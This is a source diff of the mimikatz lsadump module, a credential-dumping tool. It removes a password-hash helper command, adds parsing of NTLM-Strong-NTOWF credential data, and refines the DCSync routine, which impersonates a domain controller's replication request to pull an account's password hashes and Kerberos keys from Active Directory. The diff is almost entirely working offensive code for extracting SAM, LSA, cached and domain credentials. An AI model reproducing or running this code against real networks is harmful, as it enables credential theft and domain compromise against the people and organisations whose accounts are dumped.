@@ -1,7 +1,7 @@
 /*	Benjamin DELPY `gentilkiwi`
 	http://blog.gentilkiwi.com
 	benjamin@gentilkiwi.com
-	Licence : http://creativecommons.org/licenses/by/3.0/fr/
+	Licence : https://creativecommons.org/licenses/by/4.0/
 */
 #include "kuhl_m_lsadump.h"
 
@@ -11,10 +11,9 @@ const KUHL_M_C kuhl_m_c_lsadump[] = {
 	{kuhl_m_lsadump_cache,	L"cache",		L"Get the SysKey to decrypt NL$KM then MSCache(v2) (from registry or hives)"},
 	{kuhl_m_lsadump_lsa,	L"lsa",			L"Ask LSA Server to retrieve SAM/AD entries (normal, patch on the fly or inject)"},
 	{kuhl_m_lsadump_trust,	L"trust",		L"Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly)"},
-	{kuhl_m_lsadump_hash,	L"hash",		NULL},
 	{kuhl_m_lsadump_bkey,	L"backupkeys",	NULL},
 	{kuhl_m_lsadump_rpdata,	L"rpdata",		NULL},
-	{kuhl_m_lsadump_dcsync,	L"dcsync",		NULL},
+	{kuhl_m_lsadump_dcsync,	L"dcsync",		L"Ask a DC to synchronize an object"},
 };
 
 const KUHL_M kuhl_m_lsadump = {
@@ -631,37 +630,6 @@ BOOL kuhl_m_lsadump_getSecrets(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hPo
 	return status;
 }
 
-NTSTATUS kuhl_m_lsadump_get_dcc(PBYTE dcc, PBYTE ntlm, PUNICODE_STRING Username, DWORD realIterations)
-{
-	NTSTATUS status;
-	LSA_UNICODE_STRING HashAndLowerUsername;
-	LSA_UNICODE_STRING LowerUsername;
-	BYTE buffer[LM_NTLM_HASH_LENGTH];
-
-	status = RtlDowncaseUnicodeString(&LowerUsername, Username, TRUE);
-	if(NT_SUCCESS(status))
-	{
-		HashAndLowerUsername.Length = HashAndLowerUsername.MaximumLength = LowerUsername.Length + LM_NTLM_HASH_LENGTH;
-		if(HashAndLowerUsername.Buffer = (PWSTR) LocalAlloc(LPTR, HashAndLowerUsername.MaximumLength))
-		{
-			RtlCopyMemory(HashAndLowerUsername.Buffer, ntlm, LM_NTLM_HASH_LENGTH);
-			RtlCopyMemory((PBYTE) HashAndLowerUsername.Buffer + LM_NTLM_HASH_LENGTH, LowerUsername.Buffer, LowerUsername.Length);
-			status = RtlDigestNTLM(&HashAndLowerUsername, dcc);
-			if(realIterations && NT_SUCCESS(status))
-			{
-				if(kull_m_crypto_pkcs5_pbkdf2_hmac(CALG_SHA1, dcc, LM_NTLM_HASH_LENGTH, LowerUsername.Buffer, LowerUsername.Length, realIterations, buffer, LM_NTLM_HASH_LENGTH, FALSE))
-				{
-					RtlCopyMemory(dcc, buffer, LM_NTLM_HASH_LENGTH);
-					status = STATUS_SUCCESS;
-				}
-			}
-			LocalFree(HashAndLowerUsername.Buffer);
-		}
-		RtlFreeUnicodeString(&LowerUsername);
-	}
-	return status;
-}
-
 BOOL kuhl_m_lsadump_getNLKMSecretAndCache(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hPolicyBase, IN HKEY hSecurityBase, PNT6_SYSTEM_KEYS lsaKeysStream, PNT5_SYSTEM_KEY lsaKeyUnique, BOOL kiwime)
 {
 	BOOL status = FALSE;
@@ -726,7 +694,7 @@ BOOL kuhl_m_lsadump_getNLKMSecretAndCache(IN PKULL_M_REGISTRY_HANDLE hSecurity, 
 												kprintf(L"> Kiwi mode...\n");
 												usr.Length = usr.MaximumLength = pMsCacheEntry->szUserName;
 												usr.Buffer = (PWSTR) ((PBYTE) pMsCacheEntry->enc_data + sizeof(MSCACHE_DATA));
-												if(NT_SUCCESS(kuhl_m_lsadump_get_dcc(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, kiwiKey, &usr, iter)))
+												if(NT_SUCCESS(kull_m_crypto_get_dcc(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, kiwiKey, &usr, iter)))
 												{
 													kprintf(L"  MsCacheV2 : "); kull_m_string_wprintf_hex(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
 													if(kull_m_crypto_hmac(CALG_SHA1, pNLKM, AES_128_KEY_SIZE, pMsCacheEntry->enc_data, s1, pMsCacheEntry->cksum, MD5_DIGEST_LENGTH))
@@ -758,7 +726,7 @@ BOOL kuhl_m_lsadump_getNLKMSecretAndCache(IN PKULL_M_REGISTRY_HANDLE hSecurity, 
 													kprintf(L"> Kiwi mode...\n");
 													usr.Length = usr.MaximumLength = pMsCacheEntry->szUserName;
 													usr.Buffer = (PWSTR) ((PBYTE) pMsCacheEntry->enc_data + sizeof(MSCACHE_DATA));
-													if(NT_SUCCESS(kuhl_m_lsadump_get_dcc(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, kiwiKey, &usr, 0)))
+													if(NT_SUCCESS(kull_m_crypto_get_dcc(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, kiwiKey, &usr, 0)))
 													{
 														kprintf(L"  MsCacheV1 : "); kull_m_string_wprintf_hex(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
 														if(kull_m_crypto_hmac(CALG_MD5, key.Buffer, MD5_DIGEST_LENGTH, pMsCacheEntry->enc_data, s1, pMsCacheEntry->cksum, MD5_DIGEST_LENGTH))
@@ -1241,7 +1209,7 @@ void kuhl_m_lsadump_lsa_user(SAMPR_HANDLE DomainHandle, DWORD rid, PUNICODE_STRI
 	}
 }
 
-PCWCHAR KUHL_M_LSADUMP_SAMRPC_SUPPCRED_TYPE[] = {L"Primary", L"CLEARTEXT", L"WDigest", L"Kerberos", L"Kerberos-Newer-Keys",};
+PCWCHAR KUHL_M_LSADUMP_SAMRPC_SUPPCRED_TYPE[] = {L"Primary", L"CLEARTEXT", L"WDigest", L"Kerberos", L"Kerberos-Newer-Keys", L"NTLM-Strong-NTOWF"};
 void kuhl_m_lsadump_lsa_DescrBuffer(DWORD type, PVOID Buffer, DWORD BufferSize)
 {
 	DWORD i;
@@ -1292,6 +1260,11 @@ void kuhl_m_lsadump_lsa_DescrBuffer(DWORD type, PVOID Buffer, DWORD BufferSize)
 		pKeyDataNew = kuhl_m_lsadump_lsa_keyDataNewInfo(pKerbNew, pKeyDataNew, pKerbNew->ServiceCredentialCount, L"ServiceCredentials");
 		pKeyDataNew = kuhl_m_lsadump_lsa_keyDataNewInfo(pKerbNew, pKeyDataNew, pKerbNew->OldCredentialCount, L"OldCredentials");
 		kuhl_m_lsadump_lsa_keyDataNewInfo(pKerbNew, pKeyDataNew, pKerbNew->OlderCredentialCount, L"OlderCredentials");
+		break;
+	case 5:
+		kprintf(L"    Random Value : ");
+		kull_m_string_wprintf_hex(Buffer, BufferSize, 0);
+		kprintf(L"\n");
 		break;
 	default:
 		kull_m_string_wprintf_hex(Buffer, BufferSize, 1);
@@ -1501,60 +1474,6 @@ NTSTATUS kuhl_m_lsadump_trust(int argc, wchar_t * argv[])
 			LsaClose(hLSA);
 		}
 	}
-	return STATUS_SUCCESS;
-}
-
-NTSTATUS kuhl_m_lsadump_hash(int argc, wchar_t * argv[])
-{
-	PCWCHAR szCount, szPassword = NULL, szUsername = NULL;
-	UNICODE_STRING uPassword, uUsername, uTmp;
-	ANSI_STRING aTmp;
-	DWORD count = 10240;
-	BYTE hash[LM_NTLM_HASH_LENGTH], dcc[LM_NTLM_HASH_LENGTH], md5[MD5_DIGEST_LENGTH], sha1[SHA_DIGEST_LENGTH], sha2[32];
-	
-	kull_m_string_args_byName(argc, argv, L"password", &szPassword, NULL);
-	kull_m_string_args_byName(argc, argv, L"user", &szUsername, NULL);
-	if(kull_m_string_args_byName(argc, argv, L"count", &szCount, NULL))
-		count = wcstoul(szCount, NULL, 0);
-
-	RtlInitUnicodeString(&uPassword, szPassword);
-	RtlInitUnicodeString(&uUsername, szUsername);
-	if(NT_SUCCESS(RtlDigestNTLM(&uPassword, hash)))
-	{
-		kprintf(L"NTLM: "); kull_m_string_wprintf_hex(hash, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
-		if(szUsername)
-		{
-			if(NT_SUCCESS(kuhl_m_lsadump_get_dcc(dcc, hash, &uUsername, 0)))
-			{
-				kprintf(L"DCC1: "); kull_m_string_wprintf_hex(dcc, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
-					if(NT_SUCCESS(kuhl_m_lsadump_get_dcc(dcc, hash, &uUsername, count)))
-					{
-						kprintf(L"DCC2: "); kull_m_string_wprintf_hex(dcc, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
-					}
-			}
-		}
-	}
-
-	if(NT_SUCCESS(RtlUpcaseUnicodeString(&uTmp, &uPassword, TRUE)))
-	{
-		if(NT_SUCCESS(RtlUnicodeStringToAnsiString(&aTmp, &uTmp, TRUE)))
-		{
-			if(NT_SUCCESS(RtlDigestLM(aTmp.Buffer, hash)))
-			{
-				kprintf(L"LM  : "); kull_m_string_wprintf_hex(hash, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
-			}
-			RtlFreeAnsiString(&aTmp);
-		}
-		RtlFreeUnicodeString(&uTmp);
-	}
-
-	if(kull_m_crypto_hash(CALG_MD5, uPassword.Buffer, uPassword.Length, md5, MD5_DIGEST_LENGTH))
-		kprintf(L"MD5 : "); kull_m_string_wprintf_hex(md5, MD5_DIGEST_LENGTH, 0); kprintf(L"\n");
-	if(kull_m_crypto_hash(CALG_SHA1, uPassword.Buffer, uPassword.Length, sha1, SHA_DIGEST_LENGTH))
-		kprintf(L"SHA1: "); kull_m_string_wprintf_hex(sha1, SHA_DIGEST_LENGTH, 0); kprintf(L"\n");
-	if(kull_m_crypto_hash(CALG_SHA_256, uPassword.Buffer, uPassword.Length, sha2, 32))
-		kprintf(L"SHA2: "); kull_m_string_wprintf_hex(sha2, 32, 0); kprintf(L"\n");
-
 	return STATUS_SUCCESS;
 }
 
@@ -1793,12 +1712,13 @@ NTSTATUS kuhl_m_lsadump_rpdata(int argc, wchar_t * argv[])
 	}
 	return STATUS_SUCCESS;
 }
-
+/*	This function `dcsync` was co-writed with
+	Vincent LE TOUX ( vincent.letoux@gmail.com / http://www.mysmartlogon.com )
+*/
 NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 {
 	LSA_OBJECT_ATTRIBUTES objectAttributes = {0};
 	PPOLICY_DNS_DOMAIN_INFO pPolicyDnsDomainInfo = NULL;
-	PDOMAIN_CONTROLLER_INFO cInfo = NULL;
 	RPC_BINDING_HANDLE hBinding;
 	DRS_HANDLE hDrs = NULL;
 	DSNAME dsName = {0};
@@ -1806,23 +1726,19 @@ NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 	DWORD dwOutVersion = 0;
 	DRS_MSG_GETCHGREPLY getChRep = {0};
 	ULONG drsStatus;
-	DWORD ret;
 	LPCWSTR szUser = NULL, szGuid = NULL, szDomain = NULL, szDc = NULL;
+	LPWSTR szTmpDc = NULL;
 
 	if(!kull_m_string_args_byName(argc, argv, L"domain", &szDomain, NULL))
 		if(kull_m_net_getCurrentDomainInfo(&pPolicyDnsDomainInfo))
-				szDomain = pPolicyDnsDomainInfo->DnsDomainName.Buffer;
+			szDomain = pPolicyDnsDomainInfo->DnsDomainName.Buffer;
 
 	if(szDomain && wcschr(szDomain, L'.'))
 	{
 		kprintf(L"[DC] \'%s\' will be the domain\n", szDomain);
 		if(!(kull_m_string_args_byName(argc, argv, L"dc", &szDc, NULL) || kull_m_string_args_byName(argc, argv, L"kdc", &szDc, NULL)))
-		{
-			ret = DsGetDcName(NULL, szDomain, NULL, NULL, DS_IS_DNS_NAME | DS_RETURN_DNS_NAME, &cInfo);
-			if(ret == ERROR_SUCCESS)
-				szDc = cInfo->DomainControllerName + 2;
-			else PRINT_ERROR(L"[DC] DsGetDcName: %u\n", ret);
-		}
+			if(kull_m_net_getDC(szDomain, DS_DIRECTORY_SERVICE_REQUIRED, &szTmpDc))
+				szDc = szTmpDc;
 
 		if(szDc)
 		{
@@ -1841,10 +1757,10 @@ NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 						if(kull_m_rpc_drsr_getDCBind(&hBinding, &getChReq.V8.uuidDsaObjDest, &hDrs))
 						{
 							getChReq.V8.pNC = &dsName;
-							getChReq.V8.ulFlags = 0x00088030; // urgent, now!, 0x10 | 0x20 is cool too
+							getChReq.V8.ulFlags = DRS_INIT_SYNC | DRS_WRIT_REP | DRS_NEVER_SYNCED | DRS_FULL_SYNC_NOW | DRS_SYNC_URGENT;
 							getChReq.V8.cMaxObjects = 1;
 							getChReq.V8.cMaxBytes = 0x00a00000; // 10M
-							getChReq.V8.ulExtendedOp = 6;
+							getChReq.V8.ulExtendedOp = EXOP_REPL_OBJ;
 
 							RpcTryExcept
 							{
@@ -1879,8 +1795,8 @@ NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 	}
 	else PRINT_ERROR(L"Domain not present, or doesn\'t look like a FQDN\n");
 
-	if(cInfo)
-		NetApiBufferFree(cInfo);
+	if(szTmpDc)
+		LocalFree(szTmpDc);
 	if(pPolicyDnsDomainInfo)
 		LsaFreeMemory(pPolicyDnsDomainInfo);
 
@@ -2022,7 +1938,7 @@ void kuhl_m_lsadump_dcsync_descrUser(ATTRBLOCK *attributes)
 	if(kuhl_m_lsadump_dcsync_findMonoAttr(attributes, ATT_USER_ACCOUNT_CONTROL, &data, NULL))
 	{
 		kprintf(L"User Account Control : %08x ( ", *(PDWORD) data);
-		for(i = 0; i < sizeof(DWORD) * 8; i++)
+		for(i = 0; i < min(ARRAYSIZE(KUHL_M_LSADUMP_UF_FLAG), sizeof(DWORD) * 8); i++)
 			if((1 << i) & *(PDWORD) data)
 				kprintf(L"%s ", KUHL_M_LSADUMP_UF_FLAG[i]);
 		kprintf(L")\n");
@@ -2072,6 +1988,7 @@ DECLARE_UNICODE_STRING(PrimaryCleartext, L"Primary:CLEARTEXT");
 DECLARE_UNICODE_STRING(PrimaryWDigest, L"Primary:WDigest");
 DECLARE_UNICODE_STRING(PrimaryKerberos, L"Primary:Kerberos");
 DECLARE_UNICODE_STRING(PrimaryKerberosNew, L"Primary:Kerberos-Newer-Keys");
+DECLARE_UNICODE_STRING(PrimaryNtlmStrongNTOWF, L"Primary:NTLM-Strong-NTOWF");
 DECLARE_UNICODE_STRING(Packages, L"Packages");
 void kuhl_m_lsadump_dcsync_descrUserProperties(PUSER_PROPERTIES properties)
 {
@@ -2111,10 +2028,10 @@ void kuhl_m_lsadump_dcsync_descrUserProperties(PUSER_PROPERTIES properties)
 			else if(RtlEqualUnicodeString(&PrimaryWDigest, &Name, TRUE))
 			{
 				pWDigest = (PWDIGEST_CREDENTIALS) data;
-				for(i = 0; i < pWDigest->NumberOfHashes; i++)
+				for(j = 0; j < pWDigest->NumberOfHashes; j++)
 				{
-					kprintf(L"    %02u  ", i + 1);
-					kull_m_string_wprintf_hex(pWDigest->Hash[i], MD5_DIGEST_LENGTH, 0);
+					kprintf(L"    %02u  ", j + 1);
+					kull_m_string_wprintf_hex(pWDigest->Hash[j], MD5_DIGEST_LENGTH, 0);
 					kprintf(L"\n");
 				}
 			}
@@ -2136,7 +2053,18 @@ void kuhl_m_lsadump_dcsync_descrUserProperties(PUSER_PROPERTIES properties)
 				pKeyDataNew = kuhl_m_lsadump_lsa_keyDataNewInfo(pKerbNew, pKeyDataNew, pKerbNew->OldCredentialCount, L"OldCredentials");
 				kuhl_m_lsadump_lsa_keyDataNewInfo(pKerbNew, pKeyDataNew, pKerbNew->OlderCredentialCount, L"OlderCredentials");
 			}
-			else kull_m_string_wprintf_hex(data, szData, 1);
+			else if(RtlEqualUnicodeString(&PrimaryNtlmStrongNTOWF, &Name, TRUE))
+			{
+				kprintf(L"    Random Value : ");
+				kull_m_string_wprintf_hex(data, szData, 0);
+				kprintf(L"\n");
+			}
+			else
+			{
+				kprintf(L"    Unknown data : ");
+				kull_m_string_wprintf_hex(data, szData, 1);
+				kprintf(L"\n");
+			}
 			kprintf(L"\n");
 			LocalFree(data);
 		}
